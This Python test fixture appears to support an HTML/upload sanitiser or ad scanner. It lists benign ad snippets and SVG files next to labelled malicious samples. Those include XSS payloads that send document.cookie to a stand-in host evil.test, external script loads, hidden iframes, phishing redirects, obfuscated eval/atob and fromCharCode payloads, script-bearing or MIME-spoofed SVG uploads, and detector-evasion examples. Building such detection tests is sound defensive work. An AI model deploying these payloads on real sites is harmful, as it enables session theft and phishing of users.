"""Тестовый корпус: безопасные и вредоносные (учебные) образцы рекламы и пользовательских файлов.
Каждый элемент: (имя, kind, source/filename, mime, content, ожидается_угроза)."""
ATT = "http://evil.test:9999"
TRUSTED = "https://ads.partner-trusted.local"

BENIGN_ADS = [
    ("ad_text_link", f'<div class="ad"><a href="{TRUSTED}/promo?id=1"><b>Скидка 20%</b> на курсы</a></div>'),
    ("ad_image", '<div class="ad"><img src="/static/banner.png" alt="Баннер" width="300" height="60"></div>'),
    ("ad_paragraph", '<div class="ad"><p>Облачное хранилище <i>от 99 ₽</i></p></div>'),
    ("ad_list", '<ul><li>Ноутбуки</li><li>Смартфоны</li><li>Планшеты</li></ul>'),
    ("ad_table", '<table><tr><th>Тариф</th><th>Цена</th></tr><tr><td>Базовый</td><td>199</td></tr></table>'),
    ("ad_heading", '<h3>Новая коллекция</h3><p>Сезон осень–зима</p>'),
    ("ad_inline_style_text", '<div class="ad"><span>Только сегодня</span> <small>условия акции</small></div>'),
    ("ad_https_link", f'<a href="{TRUSTED}/offer">Подробнее</a>'),
    ("ad_long_text", '<p>' + 'Надёжный сервис для вашего бизнеса. ' * 20 + '</p>'),
    ("ad_nested", '<div><div><p><b>Акция</b></p><p>Скидки до 50%</p></div></div>'),
    ("ad_cyrillic", '<div class="ad">Запишитесь на бесплатную консультацию специалиста</div>'),
    ("ad_numbers", '<div>Курс: 1 USD = 90.5 RUB, 1 EUR = 98.1 RUB</div>'),
]

MALICIOUS_ADS = [
    ("mal_script_cookie", f'<div><script>new Image().src="{ATT}/steal?c="+document.cookie</script></div>'),
    ("mal_script_external", f'<script src="{ATT}/evil.js"></script>'),
    ("mal_onerror", f'<img src="x" onerror="fetch(\'{ATT}/s?c=\'+document.cookie)">'),
    ("mal_onload_svg_in_html", '<svg onload="alert(document.cookie)"></svg>'),
    ("mal_js_protocol", '<a href="javascript:alert(document.cookie)">Бонус</a>'),
    ("mal_js_protocol_entities", '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">Бонус</a>'),
    ("mal_js_protocol_spaced", '<a href="java\tscript:alert(1)">Бонус</a>'),
    ("mal_hidden_iframe", f'<iframe src="{ATT}/landing" width="0" height="0"></iframe>'),
    ("mal_iframe_display_none", f'<iframe src="{ATT}/x" style="display:none"></iframe>'),
    ("mal_meta_refresh", f'<meta http-equiv="refresh" content="0;url={ATT}/phish">'),
    ("mal_location_redirect", f'<script>window.location.href="{ATT}/phish"</script>'),
    ("mal_data_html", '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Открыть</a>'),
    ("mal_obfuscated_atob", '<script>eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))</script>'),
    ("mal_fromcharcode", '<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">'),
    ("mal_embed_object", f'<object data="{ATT}/flash.swf"></object>'),
    ("mal_upper_case_tags", f'<SCRIPT SRC="{ATT}/e.js"></SCRIPT>'),
    ("mal_ip_host_link_onclick", '<a href="http://203.0.113.7/pay" onclick="stealForm()">Оплата</a>'),
    ("mal_comment_split", '<scr/**/ipt>alert(1)</script>'),
]

# Образцы, которые сигнатурный анализ может пропустить (для честной оценки границ применимости)
EVASION_ADS = [
    ("evade_string_concat", '<div><p>Акция</p></div><div id="x" data-a="wind" data-b="ow.loc" data-c="ation"></div>'),
    ("evade_css_only_click", '<a href="https://ads.partner-trusted.local/p" style="position:fixed;top:0;left:0;width:100%;height:100%;opacity:0">.</a>'),
    ("evade_text_social_engineering", '<div>Ваш компьютер заражён! Позвоните по номеру +7 000 000-00-00</div>'),
]

SVG_NS = 'xmlns="http://www.w3.org/2000/svg"'
BENIGN_UPLOADS = [
    ("up_svg_circle", "logo.svg", "image/svg+xml", f'<svg {SVG_NS} width="100" height="100"><circle cx="50" cy="50" r="40" fill="red"/></svg>'),
    ("up_svg_rect_text", "icon.svg", "image/svg+xml", f'<svg {SVG_NS} width="120" height="40"><rect width="120" height="40" fill="#ddd"/><text x="10" y="25">Hello</text></svg>'),
    ("up_svg_path", "arrow.svg", "image/svg+xml", f'<svg {SVG_NS} viewBox="0 0 24 24"><path d="M2 12h20M14 4l8 8-8 8" stroke="black" fill="none"/></svg>'),
    ("up_svg_gradient", "grad.svg", "image/svg+xml", f'<svg {SVG_NS}><defs><linearGradient id="g"><stop offset="0" stop-color="#fff"/><stop offset="1" stop-color="#000"/></linearGradient></defs><rect width="100" height="50" fill="url(#g)"/></svg>'),
    ("up_txt", "notes.txt", "text/plain", "Заметки пользователя. Ничего опасного."),
    ("up_svg_xml_header", "chart.svg", "image/svg+xml", f'<?xml version="1.0" encoding="UTF-8"?><svg {SVG_NS} width="50" height="50"><line x1="0" y1="0" x2="50" y2="50" stroke="blue"/></svg>'),
]
MALICIOUS_UPLOADS = [
    ("upm_svg_script", "pic.svg", "image/svg+xml", f'<svg {SVG_NS} width="100" height="100"><script>fetch("{ATT}/steal?c="+document.cookie)</script><circle cx="50" cy="50" r="40"/></svg>'),
    ("upm_svg_onload", "pic2.svg", "image/svg+xml", f'<svg {SVG_NS} onload="new Image().src=\'{ATT}/steal?c=\'+document.cookie"><rect width="10" height="10"/></svg>'),
    ("upm_svg_foreign", "pic3.svg", "image/svg+xml", f'<svg {SVG_NS}><foreignObject width="100" height="100"><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>'),
    ("upm_svg_js_href", "pic4.svg", "image/svg+xml", f'<svg {SVG_NS} xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="javascript:alert(document.cookie)"><text y="20">Нажми</text></a></svg>'),
    ("upm_html_as_png", "photo.png", "image/png", '<html><script>alert(document.cookie)</script></html>'),
    ("upm_svg_as_jpg", "photo.jpg", "image/jpeg", f'<svg {SVG_NS} onload="alert(1)"/>'),
    ("upm_html_file", "page.html", "text/html", '<script>alert(1)</script>'),
    ("upm_js_file", "run.js", "application/javascript", 'document.location="http://evil.test/"+document.cookie'),
    ("upm_svg_xxe", "bomb.svg", "image/svg+xml", f'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a "aaaa">]><svg {SVG_NS}><text>&a;</text></svg>'),
    ("upm_svg_wrong_mime", "pic5.svg", "text/html", f'<svg {SVG_NS} onload="alert(1)"/>'),
]
